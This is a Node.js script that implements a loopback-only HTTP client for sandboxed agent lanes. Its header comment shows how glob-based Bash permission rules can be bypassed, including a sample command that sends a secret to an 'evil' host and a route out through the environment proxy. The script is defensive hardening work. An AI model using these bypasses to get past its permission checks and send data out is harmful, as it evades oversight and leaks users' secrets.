#!/usr/bin/env node
// http-get.mjs — loopback-ONLY HTTP client for dispatched lanes (BUG-279).
//
// Why this exists: the Bash permission matcher is glob-based and cannot express
// "every URL in this curl is loopback". A rule like `Bash(curl *127.0.0.1*)` or
// `Bash(curl -s http://127.0.0.1:*)` is bypassable — an appended second URL
// (`curl http://127.0.0.1:1/ https://evil/?d=SECRET`) is swallowed by the
// trailing wildcard and IS fetched (verified, BUG-279 attack B4). Enforcement
// must live in CODE, not in a glob. This script fetches ONLY when every URL is
// loopback, refuses redirects (a loopback server could 302 to a remote host),
// and is allowlisted as `Bash(node scripts/http-get.mjs:*)`.
//
// It uses Node's CORE http/https modules with a FRESH per-request agent, never
// the global fetch() and never the global agent. This is deliberate and
// load-bearing: Node 24's --use-env-proxy / NODE_USE_ENV_PROXY=1 makes BOTH
// fetch() AND the core http/https GLOBAL agents route requests through
// HTTP_PROXY/HTTPS_PROXY, so a loopback URL would be sent to a REMOTE proxy host
// — a non-loopback egress channel past this gate (BUG-279 round-2 IV break, run
// fc62ae22; confirmed the core modules are affected too, not only fetch). A
// freshly constructed `new http.Agent()` / `new https.Agent()` is NOT the
// proxy-aware global agent, so it always connects directly to the literal host.
// Deleting the proxy env vars at runtime does NOT help — the flag is applied at
// node startup — so the explicit agent is the fix, verified against Node 24.22.
//
// Usage:
//   node scripts/http-get.mjs <url> [--method GET|POST|...] [--data <body>]
//                                   [--header 'K: V' ...] [--timeout <ms>]
// Exactly one positional URL. Host must be a loopback literal.

import http from 'node:http';
import https from 'node:https';

const LOOPBACK_HOSTS = new Set(['127.0.0.1', '::1', '[::1]', 'localhost']);

function die(msg, code = 2) {
  process.stderr.write(`http-get: ${msg}\n`);
  process.exit(code);
}

const argv = process.argv.slice(2);
let url = null;
let method = 'GET';
let data = undefined;
let timeoutMs = 10000;
const headers = {};

for (let i = 0; i < argv.length; i++) {
  const a = argv[i];
  if (a === '--method' || a === '-X') { method = argv[++i]; continue; }
  if (a === '--data' || a === '-d') { data = argv[++i]; continue; }
  if (a === '--timeout') { timeoutMs = Number(argv[++i]); continue; }
  if (a === '--header' || a === '-H') {
    const h = argv[++i] || '';
    const idx = h.indexOf(':');
    if (idx === -1) die(`bad header: ${h}`);
    headers[h.slice(0, idx).trim()] = h.slice(idx + 1).trim();
    continue;
  }
  if (a.startsWith('-')) die(`unknown flag: ${a}`);
  if (url !== null) die(`only one URL is permitted (refusing to fetch multiple targets); extra arg: ${a}`);
  url = a;
}

if (!url) die('usage: node scripts/http-get.mjs <loopback-url> [--method M] [--data B] [--header "K: V"]');

let parsed;
try { parsed = new URL(url); } catch { die(`not a valid URL: ${url}`); }

if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
  die(`only http/https are permitted, got: ${parsed.protocol}`);
}
const host = parsed.hostname; // URL strips brackets from IPv6 -> '::1'
if (!LOOPBACK_HOSTS.has(host)) {
  die(`refusing non-loopback host: ${host} (only ${[...LOOPBACK_HOSTS].join(', ')} are permitted)`);
}

const mod = parsed.protocol === 'https:' ? https : http;

// A FRESH agent — never the (possibly proxy-aware) global agent. This is the
// line that closes the env-proxy egress vector; see the header comment.
const agent = parsed.protocol === 'https:' ? new https.Agent() : new http.Agent();

// Core http/https with this agent connect directly to parsed.hostname (no proxy).
// parsed.hostname is already the WHATWG-normalised host that passed the loopback
// check above.
const req = mod.request(
  parsed,
  { method, headers, timeout: timeoutMs, agent },
  (res) => {
    const status = res.statusCode ?? 0;
    // A loopback server must NOT bounce us anywhere — refuse every redirect
    // rather than follow it (the remote-redirect vector the fetch redirect:'error'
    // used to close). We never look at Location; a 3xx is a hard refusal.
    if (status >= 300 && status < 400 && res.headers.location !== undefined) {
      res.resume(); // drain so the socket can close
      die(`refusing redirect (HTTP ${status}) to ${res.headers.location}`, 1);
      return;
    }
    const chunks = [];
    res.on('data', (c) => chunks.push(c));
    res.on('end', () => {
      const body = Buffer.concat(chunks).toString('utf8');
      const nl = body.length && !body.endsWith('\n') ? '\n' : '';
      const out = `HTTP ${status}\n` + body + nl;
      const okStatus = status >= 200 && status < 300;
      // Write in ONE call and exit only from its flush callback: calling
      // process.exit() straight after a large write truncates the stdout pipe
      // before the OS drains it (a 5 MiB loopback body came back as ~256 KiB).
      process.stdout.write(out, () => process.exit(okStatus ? 0 : 1));
    });
    res.on('error', (err) => die(`response failed: ${err && err.message ? err.message : err}`, 1));
  },
);
req.on('timeout', () => { req.destroy(new Error(`timed out after ${timeoutMs}ms`)); });
req.on('error', (err) => die(`request failed: ${err && err.message ? err.message : err}`, 1));
if (data !== undefined) req.write(data);
req.end();
